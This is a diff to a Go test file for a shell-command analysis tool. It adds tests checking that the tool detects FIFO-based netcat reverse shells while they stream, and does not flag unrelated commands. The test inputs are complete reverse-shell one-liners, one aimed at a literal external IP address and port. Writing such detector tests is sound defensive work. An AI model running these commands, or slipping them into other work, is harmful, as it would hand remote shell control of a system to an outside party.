@@ -149,6 +149,31 @@ func TestAnalyzeStreamsDetectionBeforeCommandFinishes(t *testing.T) {
 	}
 }
 
+func TestAnalyzeStreamsFIFOReverseShellDetectionDuringNC(t *testing.T) {
+	ncActive := false
+	detectedWhileActive := false
+	response := analyzeWithStream(&playgroundRequest{
+		Source: `mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc host 18889 > /tmp/f`,
+	}, maximumTraceEvents, func(item *playgroundStreamItem) {
+		if item.Event != nil && item.Event.Kind == libcommand.TraceCommandStarted && item.Event.Invocation != nil && item.Event.Invocation.Name == "nc" {
+			ncActive = true
+		}
+		if item.Detection != nil && item.Detection.Command == "nc" {
+			detectedWhileActive = ncActive
+		}
+		if item.Event != nil && item.Event.Kind == libcommand.TraceCommandFinished && ncActive {
+			ncActive = false
+		}
+	})
+
+	if response.Error != "" {
+		t.Fatal(response.Error)
+	}
+	if !detectedWhileActive || len(response.Detections) != 1 {
+		t.Fatalf("detections = %#v, detected while nc active = %t", response.Detections, detectedWhileActive)
+	}
+}
+
 func TestAnalyzeStreamsDynamicNodesBeforeTheirExecution(t *testing.T) {
 	var streamed []*libcommand.TraceEvent
 	response := analyzeWithStream(&playgroundRequest{
@@ -347,15 +372,31 @@ func TestAnalyzeDoesNotClassifyOrdinaryNetworkActivity(t *testing.T) {
 	}
 }
 
-func TestAnalyzeDoesNotApplyPlaygroundSpecificPipelineDetection(t *testing.T) {
+func TestAnalyzeDetectsFIFOReverseShellThroughAnalysisCommands(t *testing.T) {
 	response := analyze(&playgroundRequest{
 		Source: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 101.132.185.173 18889 > /tmp/f`,
 	}, maximumTraceEvents)
 	if response.Error != "" {
 		t.Fatal(response.Error)
 	}
+	if len(response.Detections) != 1 {
+		t.Fatalf("detections = %#v, want one reverse-shell detection", response.Detections)
+	}
+	detection := response.Detections[0]
+	if detection.Command != "nc" || detection.Type != commandanalysis.RiskTypeReverseShell {
+		t.Fatalf("detection = %#v, want nc reverse_shell", detection)
+	}
+}
+
+func TestAnalyzeDoesNotConnectIndependentUnresolvedInputs(t *testing.T) {
+	response := analyze(&playgroundRequest{
+		Source: "mkfifo /tmp/f\ncat /tmp/f\nbash -i <<< \"$UNRESOLVED\"\nnc host 18889 <<< \"$UNRESOLVED\" > /tmp/f",
+	}, maximumTraceEvents)
+	if response.Error != "" {
+		t.Fatal(response.Error)
+	}
 	if len(response.Detections) != 0 {
-		t.Fatalf("detections = %#v, want no Playground-only pipeline detection", response.Detections)
+		t.Fatalf("detections = %#v, want no risk for independent commands", response.Detections)
 	}
 }
 
